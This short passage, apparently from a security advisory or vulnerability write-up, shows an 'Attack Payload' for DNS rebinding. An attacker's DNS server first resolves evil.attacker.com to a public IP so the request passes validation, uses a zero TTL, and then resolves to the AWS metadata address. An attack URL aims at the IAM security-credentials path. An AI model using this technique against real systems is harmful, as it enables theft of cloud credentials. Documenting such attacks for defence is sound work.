**Attack Payload**:
```text
Attacker DNS Server Configuration:
1. First query for evil.attacker.com -> 1.2.3.4 (public IP, passes validation)
2. TTL set to 0 seconds
3. Second query for evil.attacker.com -> 169.254.169.254 (AWS metadata)

Attack URL: https://evil.attacker.com/latest/meta-data/iam/security-credentials/
